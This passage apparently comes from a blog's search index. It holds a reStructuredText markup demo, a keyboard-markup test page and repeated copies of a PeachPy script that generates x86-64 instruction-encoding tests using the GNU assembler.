RFC reference ( RFC 2822 ); a subscript ; a superscript ; and explicit roles for standard inline markup. Let's test wrapping and whitespace significance in inline literals: This is an example of —inline-literal —text, —including some— strangely—hyphenated-words. Adjust-the-width-of-your-browser-window to see how the text is wrapped. — —— ———— Now note the spacing between the words of this sentence (words should be grouped in pairs). If the —pep-references option was supplied, there should be a live link to PEP 258 here. 1.1.2.2 Bullet Lists A bullet list Nested bullet list. Nested item 2. Item 2. Paragraph 2 of item 2. Nested bullet list. Nested item 2. Third level. Item 2. Nested item 3. 1.1.2.3 Enumerated Lists Arabic numerals. lower alpha) (lower roman) upper alpha. upper roman) Lists that don't start at 1: Three Four C D iii iv List items may also be auto-enumerated. 1.1.2.4 Definition Lists Term Definition Term : classifier Definition paragraph 1. Definition paragraph 2. Term Definition 1.1.2.5 Field Lists what: Field lists map field names to field bodies, like database records. They are often part of an extension syntax. They are an unambiguous variant of RFC 2822 fields. how arg1 arg2: The field marker is a colon, the field name, and a colon. The field body may contain one or more body elements, indented relative to the field marker. 1.1.2.6 Option Lists For listing command-line options: -a command-line option \"a\" -b file options can have arguments and long descriptions --long options can be long also --input= file long options can also have arguments --very-long-option The description can also start on the next line. The description may contain multiple body elements, regardless of where it starts. -x , -y , -z Multiple options are an \"option group\". -v , --verbose Commonly-seen: short & long options. -1 file , --one= file , --two file Multiple options with arguments. /V DOS / VMS -style options too There must be at least two spaces between the option and the description. 1.1.2.7 Literal Blocks Literal blocks are indicated with a double-colon (\"::\") at the end of the preceding paragraph (over there —>). They can be indented: if literal_block: text = 'is left as-is' spaces_and_linebreaks = 'are preserved' markup_processing = None Or they can be quoted without indentation: >> Great idea! > > Why didn't I think of that? 1.1.2.8 Line Blocks This is a line block. It ends with a blank line. Each new line begins with a vertical bar (\"|\"). Line breaks and initial indents are preserved. Continuation lines are wrapped portions of long lines; they begin with a space in place of the vertical bar. The left edge of a continuation line need not be aligned with the left edge of the text above it. This is a second line block. Blank lines are permitted internally, but they must begin with a \"|\". Take it away, Eric the Orchestra Leader! A one, two, a one two three four Half a bee, philosophically, must, ipso facto , half not be. But half the bee has got to be, vis a vis its entity. D'you see? But can a bee be said to be or not to be an entire bee, when half the bee is not a bee, due to some ancient injury? Singing… 1.1.2.9 Block Quotes Block quotes consist of indented body elements: My theory by A. Elk. Brackets Miss, brackets. This theory goes as follows and begins now. All brontosauruses are thin at one end, much much thicker in the middle and then thin again at the far end. That is my theory, it is mine, and belongs to me and I own it, and what it is too. —Anne Elk (Miss) 1.1.2.10 Doctest Blocks >>> print 'Python-specific usage examples; begun with \">>>\"' Python-specific usage examples; begun with \">>>\" >>> print '(cut and pasted from interactive Python sessions)' (cut and pasted from interactive Python sessions) 1.1.2.11 Tables Here's a grid table followed by a simple table: Header row, column 1 (header rows optional) Header 2 Header 3 Header 4 body row 1, column 1 column 2 column 3 column 4 body row 2 Cells may span columns. body row 3 Cells may span rows. Table cells contain body elements. body row 4 body row 5 Cells may also be empty: —> Inputs Output A B A or B False False False True False True False True True True True True 1.1.2.12 Footnotes [1] ( 1 , 2 ) A footnote contains body elements, consistently indented by at least 3 spaces. This is the footnote's second paragraph. [2] ( 1 , 2 ) Footnotes may be numbered, either manually (as in [1] ) or automatically using a \"#\"-prefixed label. This footnote has a label so it can be referred to from multiple places, both as a footnote reference ( [2] ) and as a hyperlink reference ( label ). [3] This footnote is numbered automatically and anonymously using a label of \"#\" only. [*] Footnotes may also use symbols, specified with a \"*\" label. Here's a reference to the next footnote: [†] . [†] This footnote shows the next symbol in the sequence. [4] Here's an unreferenced footnote, with a reference to a nonexistent footnote. 1.1.2.13 Citations [ CIT2002 ] ( 1 , 2 ) Citations are text-labeled footnotes. They may be rendered separately and differently from footnotes. Here's a reference to the above, [ CIT2002 ] , and . 1.1.2.14 Targets This paragraph is pointed to by the explicit \"example\" target. A reference can be found under Inline Markup , above. Inline hyperlink targets are also possible. Section headers are implicit targets, referred to by name. See Targets , which is a subsection of Body Elements . Explicit external targets are interpolated into references such as \" Python [5] \". Targets may be indirect and anonymous. Thus this phrase may also refer to the Targets section. 1.1.2.14.1 Duplicate Target Names Duplicate names in section headers or other implicit targets will generate \"info\" (level-1) system messages. Duplicate names in explicit targets will generate \"warning\" (level-2) system messages. 1.1.2.14.2 Duplicate Target Names 1.1.2.15 Directives 1.1.2.15.1 Document Parts 1.1.2.15.2 Images 1.1.2.15.3 Admonitions 1.1.2.15.4 Topics, Sidebars, and Rubrics 1.1.2.15.5 Target Footnotes 1.1.2.15.6 Replacement Text 1.1.2.15.7 Compound Paragraph These are just a sample of the many reStructuredText Directives. For others, please see http://docutils.sourceforge.net/docs/ref/rst/directives.html . 1.1.2.15.1 Document Parts An example of the \"contents\" directive can be seen above this section (a local, untitled table of contents ) and at the beginning of the document (a document-wide table of contents ). 1.1.2.15.2 Images An image directive (also clickable — a hyperlink reference): A figure directive: A figure is an image with a caption and/or a legend: re Revised, revisited, based on ‘re' module. Structured Structure-enhanced text, structuredtext. Text Well it is, isn't it? This paragraph is also part of the legend. 1.1.2.15.3 Admonitions Attention! Directives at large. Caution! Don't take any wooden nickels. ! DANGER ! Mad scientist at work! Error Does not compute. Hint It's bigger than a bread box. Important Wash behind your ears. Clean up your room. Call your mother. Back up your data. Note This is a note. Tip 15% if the service is good. Warning Strong prose may provoke extreme mental exertion. Reader discretion is strongly advised. And, by the way… You can make up your own admonition too. 1.1.2.15.4 Topics, Sidebars, and Rubrics Sidebar Title Optional Subtitle This is a sidebar. It is for text outside the flow of the main text. This is a rubric inside a sidebar Sidebars often appears beside the main text with a border and background color. Topic Title This is a topic. This is a rubric 1.1.2.15.5 Target Footnotes [5] ( 1 , 2 , 3 ) http://www.python.org/ 1.1.2.15.6 Replacement Text I recommend you try Python, the best language around [5] . 1.1.2.15.7 Compound Paragraph This paragraph contains a literal block: Connecting... OK Transmitting data... OK Disconnecting... OK and thus consists of a simple paragraph, a literal block, and another simple paragraph. Nonetheless it is semantically one paragraph. This construct is called a compound paragraph and can be produced with the \"compound\" directive. 1.1.2.16 Substitution Definitions An inline image ( ) example: (Substitution definitions are not visible in the HTML source.) 1.1.2.17 Comments Here's one: (View the HTML source to see the comment.) 1.1.3 Extensions 1.1.3.1 Code Blocks Here's a neat implementation of the Sieve of Eratosthenes. 1 2 3 4 5 6 7 8 9 def sieve_of_eratosthenes (): factors = defaultdict ( set ) for n in count ( 2 ): if factors [ n ]: for m in factors . pop ( n ): factors [ n + m ] . add ( m ) else : factors [ n * n ] . add ( n ) yield n 1.1.3.2 Mathematics Here are some remarkable equations While displaying equations look good for a page of samples, the ability to mix math and text in a paragraph is also important. This expression √ ( 3 x − 1 ) + (1 + x ) 2 is an example of an inline equation. As you see, MathJax equations can be used this way as well, without unduly disturbing the spacing between lines. 1.1.3.2.1 An Identity of Ramanujan ( 1 )/( ( √ ( φ √ ( 5 ) ) − φ ) e ( 25 )/( π ) ) = 1 + ( e − 2 π )/( 1 + ( e − 4 π )/( 1 + ( e − 6 π )/( 1 + ( e − 8 π )/( 1 + … ) ) ) ) 1.1.3.2.2 Maxwell's Equations ∇ × B ⃗ − ( 1 )/( c ) ( ∂ E ⃗ )/( ∂ t ) = ( 4 π )/( c ) j ⃗ ∇⋅ E ⃗ = 4 π ρ ∇ × E ⃗ + ( 1 )/( c ) ( ∂ B ⃗ )/( ∂ t ) = 0 ⃗ ∇⋅ B ⃗ = 0 1.1.3.3 Doc 1.1.4 Error Handling Any errors caught during processing will generate system messages.","tags":"coding","url":"2017/restructured_text_demo.html"},{"title":"Markup testing for keyboard","text":"Keys Ctrl + A Window Ctrl + J Switch Screen Ctrl + N Move Ctrl+C Window1 Ctrl+B Window2 Ctrl+A Window3 Image","tags":"blog","url":"2017/keyboard.html"},{"title":"code examples1","text":"20 # This file is part of PeachPy package and is licensed under the Simplified BSD license. 21 # See license.rst for the full text of the license. 22 23 from __future__ import print_function 24 from opcodes.x86_64 import * 25 from codegen.code import CodeWriter , CodeBlock 26 import os 27 import json 28 import subprocess 29 import tempfile 30 31 32 instruction_set = read_instruction_set () 33 34 instruction_groups = json . load ( open ( os . path . join ( os . path . dirname ( __file__ ), \"x86_64.json\" ))) 35 36 37 def filter_instruction_forms ( instruction_forms ): 38 \"\"\"Removes the instruction forms that are currently not supported\"\"\" 39 40 new_instruction_forms = list () 41 for instruction_form in instruction_forms : 42 if all ([ operand . type not in { \"r8l\" , \"r16l\" , \"r32l\" , \"moffs32\" , \"moffs64\" } for operand in instruction_form . operands ]): 43 new_instruction_forms . append ( instruction_form ) 44 return new_instruction_forms 45 46 47 def is_avx512_instruction_form ( instruction_form ): 48 return instruction_form . isa_extensions and instruction_form . isa_extensions [ 0 ] . name . startswith ( \"AVX512\" ) 49 50 51 def objcopy ( * args ): 52 objdump_path = os . environ . get ( \"OBJCOPY_FOR_X86\" , os . environ . get ( \"OBJCOPY\" )) 53 assert objdump_path , \"objcopy not found, please set the environment variable OBJCOPY_FOR_X86\" 54 objdump_process = subprocess . Popen ([ objdump_path ] + list ( args ), 55 shell = False , 56 stdin = subprocess . PIPE , stdout = subprocess . PIPE , stderr = subprocess . PIPE ) 57 ( stdoutdata , stderrdata ) = objdump_process . communicate () 58 if objdump_process . returncode != 0 : 59 print ( stdoutdata ) 60 print ( stderrdata ) 61 62 63 def gas ( * args ): 64 gas_path = os . environ . get ( \"AS_FOR_X86\" , os . environ . get ( \"GAS\" )) 65 assert gas_path , \"GNU assembler not found, please set the environment variable AS_FOR_X86\" 66 gas_process = subprocess . Popen ([ gas_path ] + list ( args ), 67 shell = False , 68 stdin = subprocess . PIPE , stdout = subprocess . PIPE , stderr = subprocess . PIPE ) 69 ( stdoutdata , stderrdata ) = gas_process . communicate () 70 if gas_process . returncode != 0 : 71 print ( stdoutdata ) 72 print ( stderrdata ) 73 return stdoutdata . decode ( 'ascii' , errors = 'replace' ) 74 75 76 def binutils_encode ( assembly ): 77 with tempfile . NamedTemporaryFile ( mode = 'w+' , delete = False ) as asm_file : 78 print ( \".text\" , file = asm_file ) 79 print ( \".intel_syntax noprefix\" , file = asm_file ) 80 print ( assembly , file = asm_file ) 81 obj_file = tempfile . NamedTemporaryFile ( delete = False ) 82 obj_file . close () 83 bin_file = tempfile . NamedTemporaryFile ( delete = False ) 84 bin_file . close () 85 try : 86 gas ( \"-o\" , obj_file . name , asm_file . name ) 87 os . remove ( asm_file . name ) 88 objcopy ( \"-O\" , \"binary\" , \"-j\" , \".text\" , obj_file . name , bin_file . name ) 89 os . remove ( obj_file . name ) 90 except OSError : 91 print ( assembly ) 92 raise 93 bytecode = bytearray ( open ( bin_file . name , \"rb\" ) . read ()) 94 os . remove ( bin_file . name ) 95 return \"bytearray([ %s ])\" % \", \" . join ([ \"0x %02X \" % b for b in bytecode ]) 96 97 98 def generate_operand ( operand , operand_number , peachpy = True , evex = False ): 99 value_map = { 100 \"r8\" : [ \"bl\" , \"r9b\" , \"dl\" , \"r11b\" ], 101 \"r16\" : [ \"si\" , \"r12w\" , \"di\" , \"r14w\" ], 102 \"r32\" : [ \"ebp\" , \"r8d\" , \"eax\" , \"r10d\" ], 103 \"r64\" : [ \"rcx\" , \"r15\" , \"rax\" , \"r13\" ], 104 \"mm\" : [ \"mm3\" , \"mm5\" ], 105 \"xmm\" : [ \"xmm1\" , \"xmm14\" , \"xmm3\" , \"xmm9\" ], 106 \"xmm{k}\" : \"xmm5{k1}\" , 107 \"xmm{k}{z}\" : \"xmm30{k2}{z}\" , 108 \"ymm\" : [ \"ymm2\" , \"ymm15\" , \"ymm4\" , \"ymm10\" ], 109 \"ymm{k}\" : \"ymm24{k3}\" , 110 \"ymm{k}{z}\" : \"ymm19{k5}{z}\" , 111 \"zmm\" : [ \"zmm3\" , \"zmm26\" , \"zmm9\" , \"zmm17\" ], 112 \"zmm{k}\" : \"zmm26{k7}\" , 113 \"zmm{k}{z}\" : \"zmm9{k6}{z}\" , 114 \"k\" : \"k5\" , 115 \"k{k}\" : \"k4{k6}\" , 116 \"m\" : \"[r15 + rsi*8 - 128]\" , 117 \"m8\" : \"byte[r14 + rdi*4 - 123]\" , 118 \"m16\" : \"word[r13 + rbp*8 - 107]\" , 119 \"m32\" : \"dword[r12 + rcx*8 - 99]\" , 120 \"m64\" : \"qword[r11 + rdx*8 - 88]\" , 121 \"m64/m32bcst\" : \"qword[r11 + rdx*8 - 88]\" , 122 \"m128\" : \"oword[r10 + rax*8 - 77]\" , 123 \"m128/m32bcst\" : \"oword[r10 + rax*8 - 77]\" , 124 \"m128/m64bcst\" : \"oword[r10 + rax*8 - 77]\" , 125 \"m256\" : \"hword[r9 + rbx*8 - 66]\" , 126 \"m256/m32bcst\" : \"hword[r9 + rbx*8 - 66]\" , 127 \"m256/m64bcst\" : \"hword[r9 + rbx*8 - 66]\" , 128 \"m512\" : \"zword[r9 + rbx*8 - 66]\" , 129 \"m512/m32bcst\" : \"zword[r9 + rbx*8 - 66]\" , 130 \"m512/m64bcst\" : \"zword[r9 + rbx*8 - 66]\" , 131 \"m8{k}{z}\" : [ \"byte[r14 - 64]\" , \"byte[r14 + 64]\" , \"byte[r14 - 128]{k1}{z}\" ], 132 \"m16{k}{z}\" : [ \"word[r13 - 64]\" , \"word[r13 + 64]\" , \"word[r13 - 128]{k2}{z}\" ], 133 \"m32{k}{z}\" : [ \"dword[r12 - 64]\" , \"dword[r12 + 64]\" , \"dword[r12 - 128]{k3}{z}\" ], 134 \"m64{k}{z}\" : [ \"qword[r11 - 64]\" , \"qword[r11 + 64]\" , \"qword[r11 - 128]{k4}{z}\" ], 135 \"m128{k}{z}\" : [ \"oword[r10 - 64]\" , \"oword[r10 + 64]\" , \"oword[r10 - 128]{k5}{z}\" ], 136 \"m256{k}{z}\" : [ \"hword[r9 - 64]\" , \"hword[r9 + 64]\" , \"hword[r9 - 128]{k6}{z}\" ], 137 \"m512{k}{z}\" : [ \"zword[r8 - 64]\" , \"zword[r8 + 64]\" , \"zword[r8 - 128]{k7}{z}\" ], 138 \"m32{k}\" : [ \"dword[r12 - 64]\" , \"dword[r12 + 64]\" , \"dword[r12 - 128]{k5}\" ], 139 \"m64{k}\" : [ \"qword[r11 - 64]\" , \"qword[r11 + 64]\" , \"qword[r11 - 128]{k6}\" ], 140 \"vm32x\" : \"[rsi + xmm0 * 4 - 128]\" , 141 \"vm32y\" : \"[r11 + ymm8 * 4 + 48]\" , 142 \"vm32z\" : \"[r15 + zmm19 * 4 - 16]\" , 143 \"vm64x\" : \"[rsi + xmm1 * 8 + 40]\" , 144 \"vm64y\" : \"[r11 + ymm9 * 8 - 56]\" , 145 \"vm64z\" : \"[r15 + zmm20 * 8 + 72]\" , 146 \"vm32x{k}\" : \"[rsi + xmm0 * 4 - 128]{k1}\" , 147 \"vm32y{k}\" : \"[r11 + ymm8 * 4 + 48]{k2}\" , 148 \"vm32z{k}\" : \"[r15 + zmm19 * 4 - 16]{k3}\" , 149 \"vm64x{k}\" : \"[rsi + xmm1 * 8 + 40]{k4}\" , 150 \"vm64y{k}\" : \"[r11 + ymm9 * 8 - 56]{k5}\" , 151 \"vm64z{k}\" : \"[r15 + zmm20 * 8 + 72]{k6}\" , 152 \"imm4\" : \"0b11\" , 153 \"imm8\" : \"2\" , 154 \"imm16\" : \"32000\" , 155 \"imm32\" : \"0x10000000\" , 156 \"imm64\" : \"0x100000000\" , 157 # \"rel32\": \"rip+0x11223344\", 158 # \"rel8\": \"rip-100\", 159 \"al\" : \"al\" , 160 \"cl\" : \"cl\" , 161 \"ax\" : \"ax\" , 162 \"eax\" : \"eax\" , 163 \"rax\" : \"rax\" , 164 \"xmm0\" : \"xmm0\" , 165 \"1\" : \"1\" , 166 \"3\" : \"3\" , 167 \"{sae}\" : \"{sae}\" , 168 \"{er}\" : \"{rn-sae}\" , 169 } 170 evex_value_map = { 171 \"xmm\" : [ \"xmm16\" , \"xmm4\" , \"xmm19\" , \"xmm31\" ], 172 \"ymm\" : [ \"ymm17\" , \"ymm5\" , \"ymm20\" , \"ymm30\" ], 173 \"m8\" : [ \"byte[r14 - 64]\" , \"byte[r14 + 64]\" , \"byte[r14 - 128]\" ], 174 \"m16\" : [ \"word[r13 - 64]\" , \"word[r13 + 64]\" , \"word[r13 - 128]\" ], 175 \"m32\" : [ \"dword[r12 - 64]\" , \"dword[r12 + 64]\" , \"dword[r12 - 128]\" ], 176 \"m64\" : [ \"qword[r11 - 64]\" , \"qword[r11 + 64]\" , \"qword[r11 - 128]\" ], 177 \"m128\" : [ \"oword[r10 - 64]\" , \"oword[r10 + 64]\" , \"oword[r10 - 128]\" ], 178 \"m256\" : [ \"hword[r9 - 64]\" , \"hword[r9 + 64]\" , \"hword[r9 - 128]\" ], 179 \"m512\" : [ \"zword[r8 - 64]\" , \"zword[r8 + 64]\" , \"zword[r8 - 128]\" ], 180 } 181 peachpy_value_map = { 182 \"vm32x{k}\" : \"[rsi + xmm0(k1) * 4 - 128]\" , 183 \"vm32y{k}\" : \"[r11 + ymm8(k2) * 4 + 48]\" , 184 \"vm32z{k}\" : \"[r15 + zmm19(k3) * 4 - 16]\" , 185 \"vm64x{k}\" : \"[rsi + xmm1(k4) * 8 + 40]\" , 186 \"vm64y{k}\" : \"[r11 + ymm9(k5) * 8 - 56]\" , 187 \"vm64z{k}\" : \"[r15 + zmm20(k6) * 8 + 72]\" , 188 } 189 optype = operand . type 190 operand = value_map . get ( optype ) 191 if evex : 192 operand = evex_value_map . get ( optype , operand ) 193 if peachpy : 194 operand = peachpy_value_map . get ( optype , operand ) 195 if isinstance ( operand , list ): 196 operand = operand [ operand_number ] 197 if operand is not None and not peachpy : 198 operand = operand . \\ 199 replace ( \"byte\" , \"BYTE PTR \" ) . \\ 200 replace ( \"dword\" , \"DWORD PTR\" ) . \\ 201 replace ( \"qword\" , \"QWORD PTR\" ) . \\ 202 replace ( \"oword\" , \"XMMWORD PTR\" ) . \\ 203 replace ( \"hword\" , \"YMMWORD PTR\" ) . \\ 204 replace ( \"zword\" , \"ZMMWORD PTR\" ) . \\ 205 replace ( \"word\" , \"WORD PTR\" ) . \\ 206 replace ( \"rip\" , \"$+2\" ) 207 if operand is not None and peachpy : 208 for kn in range ( 1 , 8 ): 209 kreg = \"k\" + str ( kn ) 210 operand = operand . replace ( \"{\" + kreg + \"}\" , \"(\" + kreg + \")\" ) 211 operand = operand . replace ( \"){z}\" , \".z)\" ) 212 operand = operand . replace ( \"{rn-sae}\" , \"{rn_sae}\" ) 213 operand = operand . replace ( \"{rz-sae}\" , \"{rz_sae}\" ) 214 operand = operand . replace ( \"{ru-sae}\" , \"{ru_sae}\" ) 215 operand = operand . replace ( \"{rd-sae}\" , \"{rd_sae}\" ) 216 return operand 217 218 219 tab = \" \" * 4 220 221 def main ( package_root = \".\" ): 222 for group , instruction_names in instruction_groups . items (): 223 with open ( os . path . join ( package_root , \"test\" , \"x86_64\" , \"encoding\" , \"test_ %s .py\" % group ), \"w\" ) as out : 224 with CodeWriter () as code : 225 code . line ( \"# This file is auto-generated by /codegen/x86_64_test_encoding.py\" ) 226 code . line ( \"# Reference opcodes are generated by:\" ) 227 code . line ( \"# \" + gas ( \"--version\" ) . splitlines ()[ 0 ]) 228 code . line () 229 code . line ( \"from peachpy.x86_64 import *\" ) 230 code . line ( \"import unittest\" ) 231 code . line () 232 code . line () 233 for name in instruction_names : 234 code . line ( \"class Test %s (unittest.TestCase):\" % name ) 235 with CodeBlock (): 236 code . line ( \"def runTest(self):\" ) 237 with CodeBlock (): 238 # Instructions with `name` name 239 name_instructions = list ( filter ( lambda i : i . name == name , instruction_set )) 240 if not name_instructions : 241 print ( \"No forms for instruction: \" + name ) 242 continue 243 assert len ( name_instructions ) == 1 244 name_instruction = name_instructions [ 0 ] 245 246 has_assertions = False 247 for instruction_form in filter_instruction_forms ( name_instruction . forms ): 248 is_avx512 = is_avx512_instruction_form ( instruction_form ) 249 peachpy_operands = [ generate_operand ( o , i , peachpy = True , evex = is_avx512 ) for ( i , o ) 250 in enumerate ( instruction_form . operands )] 251 gas_operands = [ generate_operand ( o , i , peachpy = False , evex = is_avx512 ) for ( i , o ) 252 in enumerate ( instruction_form . operands )] 253 if not any ( map ( lambda op : op is None , gas_operands )): 254 gas_assembly = \" %s %s \" % ( instruction_form . name , \", \" . join ( gas_operands )) 255 peachpy_assembly = \" %s ( %s )\" % ( instruction_form . name , \", \" . join ( peachpy_operands )) 256 reference_bytecode = binutils_encode ( gas_assembly ) 257 code . line ( \"self.assertEqual( %s , %s .encode())\" % 258 ( reference_bytecode , peachpy_assembly )) 259 has_assertions = True 260 if not has_assertions : 261 code . line ( \"pass\" ) 262 code . line () 263 code . line () 264 265 print ( str ( code ), file = out ) 266 267 if __name__ == '__main__' : 268 main ()","tags":"code","url":"2017/code1.html"},{"title":"code examples1","text":"20 # This file is part of PeachPy package and is licensed under the Simplified BSD license. 21 # See license.rst for the full text of the license. 22 23 from __future__ import print_function 24 from opcodes.x86_64 import * 25 from codegen.code import CodeWriter , CodeBlock 26 import os 27 import json 28 import subprocess 29 import tempfile 30 31 32 instruction_set = read_instruction_set () 33 34 instruction_groups = json . load ( open ( os . path . join ( os . path . dirname ( __file__ ), \"x86_64.json\" ))) 35 36 37 def filter_instruction_forms ( instruction_forms ): 38 \"\"\"Removes the instruction forms that are currently not supported\"\"\" 39 40 new_instruction_forms = list () 41 for instruction_form in instruction_forms : 42 if all ([ operand . type not in { \"r8l\" , \"r16l\" , \"r32l\" , \"moffs32\" , \"moffs64\" } for operand in instruction_form . operands ]): 43 new_instruction_forms . append ( instruction_form ) 44 return new_instruction_forms 45 46 47 def is_avx512_instruction_form ( instruction_form ): 48 return instruction_form . isa_extensions and instruction_form . isa_extensions [ 0 ] . name . startswith ( \"AVX512\" ) 49 50 51 def objcopy ( * args ): 52 objdump_path = os . environ . get ( \"OBJCOPY_FOR_X86\" , os . environ . get ( \"OBJCOPY\" )) 53 assert objdump_path , \"objcopy not found, please set the environment variable OBJCOPY_FOR_X86\" 54 objdump_process = subprocess . Popen ([ objdump_path ] + list ( args ), 55 shell = False , 56 stdin = subprocess . PIPE , stdout = subprocess . PIPE , stderr = subprocess . PIPE ) 57 ( stdoutdata , stderrdata ) = objdump_process . communicate () 58 if objdump_process . returncode != 0 : 59 print ( stdoutdata ) 60 print ( stderrdata ) 61 62 63 def gas ( * args ): 64 gas_path = os . environ . get ( \"AS_FOR_X86\" , os . environ . get ( \"GAS\" )) 65 assert gas_path , \"GNU assembler not found, please set the environment variable AS_FOR_X86\" 66 gas_process = subprocess . Popen ([ gas_path ] + list ( args ), 67 shell = False , 68 stdin = subprocess . PIPE , stdout = subprocess . PIPE , stderr = subprocess . PIPE ) 69 ( stdoutdata , stderrdata ) = gas_process . communicate () 70 if gas_process . returncode != 0 : 71 print ( stdoutdata ) 72 print ( stderrdata ) 73 return stdoutdata . decode ( 'ascii' , errors = 'replace' ) 74 75 76 def binutils_encode ( assembly ): 77 with tempfile . NamedTemporaryFile ( mode = 'w+' , delete = False ) as asm_file : 78 print ( \".text\" , file = asm_file ) 79 print ( \".intel_syntax noprefix\" , file = asm_file ) 80 print ( assembly , file = asm_file ) 81 obj_file = tempfile . NamedTemporaryFile ( delete = False ) 82 obj_file . close () 83 bin_file = tempfile . NamedTemporaryFile ( delete = False ) 84 bin_file . close () 85 try : 86 gas ( \"-o\" , obj_file . name , asm_file . name ) 87 os . remove ( asm_file . name ) 88 objcopy ( \"-O\" , \"binary\" , \"-j\" , \".text\" , obj_file . name , bin_file . name ) 89 os . remove ( obj_file . name ) 90 except OSError : 91 print ( assembly ) 92 raise 93 bytecode = bytearray ( open ( bin_file . name , \"rb\" ) . read ()) 94 os . remove ( bin_file . name ) 95 return \"bytearray([ %s ])\" % \", \" . join ([ \"0x %02X \" % b for b in bytecode ]) 96 97 98 def generate_operand ( operand , operand_number , peachpy = True , evex = False ): 99 value_map = { 100 \"r8\" : [ \"bl\" , \"r9b\" , \"dl\" , \"r11b\" ], 101 \"r16\" : [ \"si\" , \"r12w\" , \"di\" , \"r14w\" ], 102 \"r32\" : [ \"ebp\" , \"r8d\" , \"eax\" , \"r10d\" ], 103 \"r64\" : [ \"rcx\" , \"r15\" , \"rax\" , \"r13\" ], 104 \"mm\" : [ \"mm3\" , \"mm5\" ], 105 \"xmm\" : [ \"xmm1\" , \"xmm14\" , \"xmm3\" , \"xmm9\" ], 106 \"xmm{k}\" : \"xmm5{k1}\" , 107 \"xmm{k}{z}\" : \"xmm30{k2}{z}\" , 108 \"ymm\" : [ \"ymm2\" , \"ymm15\" , \"ymm4\" , \"ymm10\" ], 109 \"ymm{k}\" : \"ymm24{k3}\" , 110 \"ymm{k}{z}\" : \"ymm19{k5}{z}\" , 111 \"zmm\" : [ \"zmm3\" , \"zmm26\" , \"zmm9\" , \"zmm17\" ], 112 \"zmm{k}\" : \"zmm26{k7}\" , 113 \"zmm{k}{z}\" : \"zmm9{k6}{z}\" , 114 \"k\" : \"k5\" , 115 \"k{k}\" : \"k4{k6}\" , 116 \"m\" : \"[r15 + rsi*8 - 128]\" , 117 \"m8\" : \"byte[r14 + rdi*4 - 123]\" , 118 \"m16\" : \"word[r13 + rbp*8 - 107]\" , 119 \"m32\" : \"dword[r12 + rcx*8 - 99]\" , 120 \"m64\" : \"qword[r11 + rdx*8 - 88]\" , 121 \"m64/m32bcst\" : \"qword[r11 + rdx*8 - 88]\" , 122 \"m128\" : \"oword[r10 + rax*8 - 77]\" , 123 \"m128/m32bcst\" : \"oword[r10 + rax*8 - 77]\" , 124 \"m128/m64bcst\" : \"oword[r10 + rax*8 - 77]\" , 125 \"m256\" : \"hword[r9 + rbx*8 - 66]\" , 126 \"m256/m32bcst\" : \"hword[r9 + rbx*8 - 66]\" , 127 \"m256/m64bcst\" : \"hword[r9 + rbx*8 - 66]\" , 128 \"m512\" : \"zword[r9 + rbx*8 - 66]\" , 129 \"m512/m32bcst\" : \"zword[r9 + rbx*8 - 66]\" , 130 \"m512/m64bcst\" : \"zword[r9 + rbx*8 - 66]\" , 131 \"m8{k}{z}\" : [ \"byte[r14 - 64]\" , \"byte[r14 + 64]\" , \"byte[r14 - 128]{k1}{z}\" ], 132 \"m16{k}{z}\" : [ \"word[r13 - 64]\" , \"word[r13 + 64]\" , \"word[r13 - 128]{k2}{z}\" ], 133 \"m32{k}{z}\" : [ \"dword[r12 - 64]\" , \"dword[r12 + 64]\" , \"dword[r12 - 128]{k3}{z}\" ], 134 \"m64{k}{z}\" : [ \"qword[r11 - 64]\" , \"qword[r11 + 64]\" , \"qword[r11 - 128]{k4}{z}\" ], 135 \"m128{k}{z}\" : [ \"oword[r10 - 64]\" , \"oword[r10 + 64]\" , \"oword[r10 - 128]{k5}{z}\" ], 136 \"m256{k}{z}\" : [ \"hword[r9 - 64]\" , \"hword[r9 + 64]\" , \"hword[r9 - 128]{k6}{z}\" ], 137 \"m512{k}{z}\" : [ \"zword[r8 - 64]\" , \"zword[r8 + 64]\" , \"zword[r8 - 128]{k7}{z}\" ], 138 \"m32{k}\" : [ \"dword[r12 - 64]\" , \"dword[r12 + 64]\" , \"dword[r12 - 128]{k5}\" ], 139 \"m64{k}\" : [ \"qword[r11 - 64]\" , \"qword[r11 + 64]\" , \"qword[r11 - 128]{k6}\" ], 140 \"vm32x\" : \"[rsi + xmm0 * 4 - 128]\" , 141 \"vm32y\" : \"[r11 + ymm8 * 4 + 48]\" , 142 \"vm32z\" : \"[r15 + zmm19 * 4 - 16]\" , 143 \"vm64x\" : \"[rsi + xmm1 * 8 + 40]\" , 144 \"vm64y\" : \"[r11 + ymm9 * 8 - 56]\" , 145 \"vm64z\" : \"[r15 + zmm20 * 8 + 72]\" , 146 \"vm32x{k}\" : \"[rsi + xmm0 * 4 - 128]{k1}\" , 147 \"vm32y{k}\" : \"[r11 + ymm8 * 4 + 48]{k2}\" , 148 \"vm32z{k}\" : \"[r15 + zmm19 * 4 - 16]{k3}\" , 149 \"vm64x{k}\" : \"[rsi + xmm1 * 8 + 40]{k4}\" , 150 \"vm64y{k}\" : \"[r11 + ymm9 * 8 - 56]{k5}\" , 151 \"vm64z{k}\" : \"[r15 + zmm20 * 8 + 72]{k6}\" , 152 \"imm4\" : \"0b11\" , 153 \"imm8\" : \"2\" , 154 \"imm16\" : \"32000\" , 155 \"imm32\" : \"0x10000000\" , 156 \"imm64\" : \"0x100000000\" , 157 # \"rel32\": \"rip+0x11223344\", 158 # \"rel8\": \"rip-100\", 159 \"al\" : \"al\" , 160 \"cl\" : \"cl\" , 161 \"ax\" : \"ax\" , 162 \"eax\" : \"eax\" , 163 \"rax\" : \"rax\" , 164 \"xmm0\" : \"xmm0\" , 165 \"1\" : \"1\" , 166 \"3\" : \"3\" , 167 \"{sae}\" : \"{sae}\" , 168 \"{er}\" : \"{rn-sae}\" , 169 } 170 evex_value_map = { 171 \"xmm\" : [ \"xmm16\" , \"xmm4\" , \"xmm19\" , \"xmm31\" ], 172 \"ymm\" : [ \"ymm17\" , \"ymm5\" , \"ymm20\" , \"ymm30\" ], 173 \"m8\" : [ \"byte[r14 - 64]\" , \"byte[r14 + 64]\" , \"byte[r14 - 128]\" ], 174 \"m16\" : [ \"word[r13 - 64]\" , \"word[r13 + 64]\" , \"word[r13 - 128]\" ], 175 \"m32\" : [ \"dword[r12 - 64]\" , \"dword[r12 + 64]\" , \"dword[r12 - 128]\" ], 176 \"m64\" : [ \"qword[r11 - 64]\" , \"qword[r11 + 64]\" , \"qword[r11 - 128]\" ], 177 \"m128\" : [ \"oword[r10 - 64]\" , \"oword[r10 + 64]\" , \"oword[r10 - 128]\" ], 178 \"m256\" : [ \"hword[r9 - 64]\" , \"hword[r9 + 64]\" , \"hword[r9 - 128]\" ], 179 